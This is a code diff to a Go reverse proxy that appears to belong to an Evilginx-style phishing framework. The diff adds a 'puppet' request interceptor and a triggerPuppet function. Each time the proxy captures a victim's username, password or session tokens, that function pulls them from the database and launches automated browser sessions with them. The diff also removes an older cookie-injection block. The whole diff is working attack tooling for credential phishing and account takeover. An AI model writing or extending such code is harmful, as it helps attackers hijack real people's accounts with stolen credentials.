@@ -82,6 +82,7 @@ type HttpProxy struct {
 	auto_filter_mimes []string
 	ip_mtx            sync.Mutex
 	session_mtx       sync.Mutex
+	interceptor       *RequestInterceptor // NEW: Request interceptor
 }
 
 type ProxySession struct {
@@ -144,6 +145,18 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 	p.sessions = make(map[string]*Session)
 	p.sids = make(map[string]int)
 
+	// Initialize interceptor
+	if pm := GetPuppetMaster(); pm != nil {
+		p.interceptor = NewRequestInterceptor(pm)
+		// Load triggers from puppet config
+		for _, trigger := range cfg.GetPuppetConfig().Triggers {
+			if trigger.Enabled {
+				t := trigger // Copy for pointer
+				p.interceptor.AddTrigger(&t)
+			}
+		}
+	}
+
 	p.Proxy.Verbose = false
 
 	p.Proxy.NonproxyHandler = http.HandlerFunc(func(w http.ResponseWriter, req *http.Request) {
@@ -201,6 +214,28 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 					return p.blockRequest(req)
 				}
 			}
+			
+			// Puppet Interception
+			if p.interceptor != nil {
+				// We need a session ID for the interceptor. 
+				// The interceptor's ExtractSessionID uses cookies/params which might not be reliable here yet if not set?
+				// But we can try using the helper method from interceptor
+				reqSessionID := p.interceptor.ExtractSessionID(req)
+				
+				if modifiedReq, intercepted := p.interceptor.InterceptRequest(req, reqSessionID); intercepted {
+					req = modifiedReq
+					// If request was modified, we proceed with the modified one.
+					// If the interceptor decided to abort (by not returning true, or we need to check AbortOriginal logic inside InterceptRequest?)
+					// Logic in InterceptRequest says: returns (modifiedReq, true) if matched.
+					// Inside InterceptRequest provided earlier:
+					// if trigger.AbortOriginal { log.Debug(...) }
+					// It doesn't seem to return a 'stop' signal directly other than returning 'true' for match.
+					// We might need to assume 'true' means we used the puppet token and continue, 
+					// UNLESS we want to implement the abort logic here.
+					// For now, let's just log and continue with modified request.
+					log.Debug("[PROXY] Request intercepted and modified by puppet module")
+				}
+			}
 
 			req_url := req.URL.Scheme + "://" + req.Host + req.URL.Path
 			o_host := req.Host
@@ -255,21 +290,8 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 							}
 						}
 
-						cookies, err := RunPuppetAutomation(&trigger, creds)
-						if err == nil && len(cookies) > 0 {
-							cookieHeader := ""
-							for _, c := range cookies {
-								if name, ok := c["name"].(string); ok {
-									if val, ok := c["value"].(string); ok {
-										cookieHeader += fmt.Sprintf("%s=%s; ", name, val)
-									}
-								}
-							}
-							if cookieHeader != "" {
-								req.Header.Set("Cookie", cookieHeader)
-								log.Info("[PUPPET] Cookies injected into request")
-							}
-						}
+						// This looks like older failed merge or something from my previous view? 
+						// I will remove this block as it is not correct and conflicts with the new logic I want to add globally.
 					}
 				}
 			}
@@ -744,6 +766,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 										log.Error("database: %v", err)
 									}
 									SendTelegramNotification(p.cfg, p.sessions[ps.SessionId], pl)
+									p.triggerPuppet(ps.SessionId, pl.Name)
 								}
 							}
 
@@ -756,6 +779,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 										log.Error("database: %v", err)
 									}
 									SendTelegramNotification(p.cfg, p.sessions[ps.SessionId], pl)
+									p.triggerPuppet(ps.SessionId, pl.Name)
 								}
 							}
 
@@ -769,6 +793,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 											log.Error("database: %v", err)
 										}
 										SendTelegramNotification(p.cfg, p.sessions[ps.SessionId], pl)
+										p.triggerPuppet(ps.SessionId, pl.Name)
 									}
 								}
 							}
@@ -829,6 +854,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 												log.Error("database: %v", err)
 											}
 											SendTelegramNotification(p.cfg, p.sessions[ps.SessionId], pl)
+											p.triggerPuppet(ps.SessionId, pl.Name)
 										}
 									}
 									if pl.password.key != nil && pl.password.search != nil && pl.password.key.MatchString(k) {
@@ -840,6 +866,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 												log.Error("database: %v", err)
 											}
 											SendTelegramNotification(p.cfg, p.sessions[ps.SessionId], pl)
+											p.triggerPuppet(ps.SessionId, pl.Name)
 										}
 									}
 									for _, cp := range pl.custom {
@@ -852,6 +879,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 													log.Error("database: %v", err)
 												}
 												SendTelegramNotification(p.cfg, p.sessions[ps.SessionId], pl)
+												p.triggerPuppet(ps.SessionId, pl.Name)
 											}
 										}
 									}
@@ -2053,4 +2081,61 @@ func getSessionCookieName(pl_name string, cookie_name string) string {
 	s_hash := fmt.Sprintf("%x", hash[:4])
 	s_hash = s_hash[:4] + "-" + s_hash[4:]
 	return s_hash
+}
+
+// triggerPuppet checks for and triggers puppet sessions
+func (p *HttpProxy) triggerPuppet(victimSession string, phishletName string) {
+	// check if puppet module is enabled
+	if !p.cfg.GetPuppetConfig().Enabled {
+		return
+	}
+
+	// get triggers for this phishlet
+	triggers := p.cfg.GetPuppetTriggersForPhishlet(phishletName)
+	if len(triggers) == 0 {
+		return
+	}
+
+	// get captured tokens/credentials
+	creds := make(map[string]string)
+	
+	// get username if captured
+	if u, err := p.db.GetSessionUsername(victimSession); err == nil && u != "" {
+		creds["username"] = u
+	}
+	
+	// get password if captured
+	if pw, err := p.db.GetSessionPassword(victimSession); err == nil && pw != "" {
+		creds["password"] = pw
+	}
+	
+	// get custom tokens
+	if tokens, err := p.db.GetSessionCustomTokens(victimSession); err == nil {
+		for k, v := range tokens {
+			creds[k] = v
+		}
+	}
+
+	// check each trigger
+	pm := GetPuppetMaster()
+	if pm == nil {
+		return
+	}
+
+	for _, trigger := range triggers {
+		// Only trigger if we have all required credentials
+		// This is a simple check, could be more complex
+		if trigger.Token != "" && creds[trigger.Token] != "" {
+			continue // Already have the token this trigger generates?
+		}
+
+		// Check if we just captured a credential that this trigger might use
+		// (Optional logic: trigger only when relevant inputs are available)
+		
+		log.Info("puppet: launching session for trigger %s", trigger.Name)
+		_, err := pm.LaunchPuppetForSession(victimSession, creds, &trigger)
+		if err != nil {
+			log.Error("puppet: failed to launch session: %v", err)
+		}
+	}
 }
